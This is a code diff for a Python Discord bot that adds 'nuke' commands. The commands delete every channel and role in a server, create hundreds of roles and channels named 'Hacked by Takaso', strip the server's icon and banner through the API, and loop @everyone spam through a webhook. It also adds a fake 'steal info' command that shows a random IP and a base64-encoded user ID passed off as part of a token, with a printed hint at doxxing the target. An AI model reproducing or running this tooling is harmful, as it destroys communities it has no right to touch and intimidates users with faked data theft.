@@ -103,7 +103,196 @@ async def deletechannels_worker(queue):
                 print(e)
 
 
-@slayer.command(description="Asyncio Queue Cdel.")
+thechans = []
+@slayer.command()
+async def nuke(ctx):
+    global checkweb
+    global serwer
+    checkweb = True
+    extrapayload = {
+        "banner": "null",
+        "icon": "null",
+    }
+    serwer = str(ctx.guild.id)
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    guild = ctx.guild
+    try:
+        await guild.edit(name="Nuked by Takaso | Sub to my YT")
+    except:
+        pass
+    try:
+        r = requests.patch(f"https://canary.discord.com/api/v9/guilds/{serwer}", headers=headers, json=extrapayload)
+    except:
+        pass
+    for channel in guild.channels:
+        thechans.append(channel.id)
+    try:
+        await deleteall()
+    except:
+        pass
+    try:
+        threadchan()
+    except:
+        pass
+    try:
+        roletasks = [deleteroles(ctx), rolenuke(ctx), lastcheck(ctx)]
+        asyncio.gather(*roletasks)
+    except:
+        pass
+
+channel_names = ["Hacked by Takaso", "Heil Takaso", "sus"]
+
+
+##########################################################################################
+
+# Extra Command I made to test the channel delete
+
+@slayer.command()
+async def tester(ctx, amount = 100, *, name = None):
+  try:
+      await ctx.message.delete()
+  except:
+      pass
+  if name == None:
+    for x in range(amount):
+      try:
+        await ctx.guild.create_text_channel(random.choice(channel_names))
+      except discord.Forbidden:
+        print("aaaaa")
+        return
+      except:
+        pass
+  else:
+    for x in range(amount):
+      try:
+        await ctx.guild.create_text_channel(name)
+      except discord.Forbidden:
+        print("cazzo")
+        return
+      except:
+        pass
+
+
+
+async def deleteroles(ctx):
+    for roles in list(ctx.guild.roles):
+        try:
+            await roles.delete()
+        except:
+            pass
+
+async def rolenuke(ctx):
+    for x in range(500):
+        try:
+            await ctx.guild.create_role(name="Nuked by Takaso")
+        except:
+            pass
+
+@slayer.command()
+async def lastcheck(ctx):
+    for channel in ctx.guild.channels:
+        if channel.name != "heil-takaso":
+            try:
+                await channel.delete()
+            except:
+                pass
+
+#########################################################################################
+
+@slayer.command()
+async def load(ctx, ID):
+    await ctx.message.delete()
+    progress = [
+     "1% - 〔█                              〕",
+     "3% - 〔██                             〕",
+     "6% - 〔███                            〕",
+     "9% - 〔████                           〕",
+     "12% -〔█████                          〕",
+     "15% -〔██████                         〕",
+     "18% -〔███████                        〕",
+     "21% -〔███████                        〕",
+     "22% -〔███████                        〕",
+     "24% -〔████████                       〕",
+     "26% -〔█████████                      〕",
+     "29% -〔██████████                     〕",
+     "31% -〔███████████                    〕",
+     "36% -〔████████████                   〕",
+     "41% -〔█████████████                  〕",
+     "43% -〔██████████████                 〕",
+     "46% -〔███████████████                〕",
+     "49% -〔████████████████               〕",
+     "50% -〔████████████████               〕",
+     "52% -〔█████████████████              〕",
+     "56% -〔██████████████████             〕",
+     "59% -〔███████████████████            〕",
+     "64% -〔████████████████████           〕",
+     "69% -〔█████████████████████          〕",
+     "71% -〔██████████████████████         〕",
+     "74% -〔███████████████████████        〕",
+     "79% -〔████████████████████████       〕",
+     "82% -〔█████████████████████████      〕",
+     "86% -〔██████████████████████████     〕",
+     "89% -〔███████████████████████████    〕",
+     "93% -〔████████████████████████████   〕",
+     "93% -〔████████████████████████████   〕",
+     "94% -〔█████████████████████████████  〕",
+     "95% -〔█████████████████████████████  〕",
+     "96% -〔█████████████████████████████  〕",
+     "97% -〔█████████████████████████████  〕",
+     "98% -〔██████████████████████████████ 〕",
+     "100% -〔███████████████████████████████〕",
+     "100% -〔███████████████████████████████〕",
+     "100% -〔███████████████████████████████〕",
+     ]
+    kkk = await ctx.send(f"```\nStarting the process to steal <@{ID}>'s info.\n```")
+    bar = await ctx.send("```\n0% - 〔█                              〕\n```")
+    for loads in progress:
+        await bar.edit(content=f"""
+```
+[{loads}]
+```
+""")
+    await kkk.delete()
+    await bar.delete()
+    IP1 = random.randint(0, 255)
+    IP2 = random.randint(0, 255)
+    IP3 = random.randint(0, 255)
+    IP4 = random.randint(0, 255)
+    sample_string = str(ID)
+    sample_string_bytes = sample_string.encode("ascii")
+    base64_bytes = base64.b64encode(sample_string_bytes)
+    base64_string = base64_bytes.decode("ascii")
+    try:
+        await ctx.send(f"""
+```
+Here's the Info:
+
+IPv4: {IP1}.{IP2}.{IP3}.{IP4}
+First piece of Token: {base64_string}
+```
+""")
+    except:
+        print(f"\n%sSomething went wrong, you got kicked from the guild or either the user blocked you, here's your argument {ID} in case you wanna Toxx him.%s" % (red(), reset()))
+
+    
+@slayer.command()
+async def purge(ctx):
+    await ctx.message.delete()
+    async for message in ctx.message.channel.history(limit=500).filter(
+        lambda m: m.author == slayer.user
+    ).map(lambda m: m):
+        try:
+            await message.delete()
+        except:
+            pass
+
+
+
+
+@slayer.command()
 async def q_del(ctx):
     try:
         await ctx.message.delete()
@@ -164,7 +353,7 @@ async def ccr(ctx):
 
 def chanflood():
     payload = {
-        "name": "heil aos and uag",
+        "name": "heil takaso",
         "type": "0"
     }
     try:
@@ -188,7 +377,7 @@ async def on_guild_channel_create(channel):
       webhook = await channel.create_webhook(name="Takaso")
       try:
           while True:
-              await webhook.send(content=" > Nuked by **AOS** and **UAG**\n```py\n'Imagine having your surver fucked by Takaso LMAO'\n```\nhttps://www.youtube.com/watch?v=6HERu7qn1xg\n > **HEIL TAKASO**\n@everyone")
+              await webhook.send(content=" > Nuked by **Takaso**\n```py\n'Imagine having your surver fucked.'\n```\nhttps://www.youtube.com/watch?v=6HERu7qn1xg\n > **HEIL TAKASO**\n@everyone")
       except:
           pass
 
@@ -467,6 +656,30 @@ def react_messages():
                 time.sleep(json['retry_after'])
         except:
             pass
+
+@slayer.command()
+async def q_nuke(ctx):
+    global checkweb
+    global serwer
+    checkweb = True
+    serwer = str(ctx.guild.id)
+    guild = ctx.guild
+    try:
+        await guild.edit(name="Nuked by Takaso | Sub to my YT")
+    except:
+        pass
+    await q_del(ctx)
+    try:
+        threadchan()
+    except:
+        pass
+    try:
+        roletasks = [deleteroles(ctx), rolenuke(ctx), lastcheck(ctx)]
+        asyncio.gather(*roletasks)
+    except:
+        pass
+
+
 
 
 if account_type in Answers:
